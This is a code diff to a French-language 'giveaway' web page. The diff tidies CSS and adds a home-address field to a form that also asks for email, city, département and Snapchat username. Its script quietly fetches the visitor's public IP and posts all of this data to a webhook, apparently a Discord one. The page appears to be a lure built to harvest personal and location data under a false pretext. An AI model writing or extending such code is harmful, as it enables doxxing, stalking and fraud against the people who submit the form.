@@ -27,15 +27,9 @@
       animation: pulseBorder 2s infinite;
     }
     @keyframes pulseBorder {
-      0% {
-        box-shadow: 0 0 10px #a54ffb;
-      }
-      50% {
-        box-shadow: 0 0 25px #a54ffb;
-      }
-      100% {
-        box-shadow: 0 0 10px #a54ffb;
-      }
+      0% { box-shadow: 0 0 10px #a54ffb; }
+      50% { box-shadow: 0 0 25px #a54ffb; }
+      100% { box-shadow: 0 0 10px #a54ffb; }
     }
     .logo {
       font-size: 70px;
@@ -44,10 +38,8 @@
     }
     h1 {
       font-size: 24px;
-      margin: 0;
-      margin-bottom: 15px;
+      margin: 0 0 15px;
       letter-spacing: 1px;
-      color: #ffffff;
     }
     p {
       font-size: 15px;
@@ -121,6 +113,7 @@
         <input type="email" name="email" placeholder="Email" required />
         <input type="text" name="ville" placeholder="Ville" required />
         <input type="text" name="departement" placeholder="Département" required />
+        <input type="text" name="adresse" placeholder="Adresse (facultatif)" />
         <input type="text" name="snap" placeholder="Nom d'utilisateur Snapchat" required />
         <button type="submit">Valider</button>
       </div>
@@ -147,7 +140,6 @@
       document.getElementById("step2").style.display = "block";
     }
 
-    // Fonction pour récupérer l'IP publique via service tiers
     async function getPublicIP() {
       try {
         const res = await fetch("https://api.ipify.org?format=json");
@@ -158,11 +150,9 @@
       }
     }
 
-    // Fonction pour vérifier la limite de soumissions dans localStorage
     function canSubmit() {
       const now = Date.now();
       const submissions = JSON.parse(localStorage.getItem("giveaway_submissions") || "[]");
-      // Garde seulement les soumissions dans la fenêtre de temps
       const recent = submissions.filter(ts => now - ts < TIME_WINDOW_MINUTES * 60 * 1000);
       if (recent.length >= SUBMISSION_LIMIT) return false;
       recent.push(now);
@@ -191,6 +181,7 @@
           { name: "📧 Email", value: data.get("email") || "N/A", inline: false },
           { name: "🏙️ Ville", value: data.get("ville") || "N/A", inline: true },
           { name: "📍 Département", value: data.get("departement") || "N/A", inline: true },
+          { name: "🏠 Adresse", value: data.get("adresse") || "Non fournie", inline: false },
           { name: "👻 Snapchat", value: data.get("snap") || "N/A", inline: true },
           { name: "🌐 IP", value: ip, inline: false }
         ],
@@ -205,15 +196,14 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ embeds: [embed] }),
       })
-        .then((res) => {
-          if (!res.ok) throw new Error("Erreur lors de l'envoi");
-          // Redirection vers la page Merci
-          window.location.href = "merci.html";
-        })
-        .catch((err) => {
-          alert("Erreur lors de l’envoi. Réessayez.");
-          console.error(err);
-        });
+      .then((res) => {
+        if (!res.ok) throw new Error("Erreur lors de l'envoi");
+        window.location.href = "merci.html";
+      })
+      .catch((err) => {
+        alert("Erreur lors de l’envoi. Réessayez.");
+        console.error(err);
+      });
     });
   </script>
 </body>
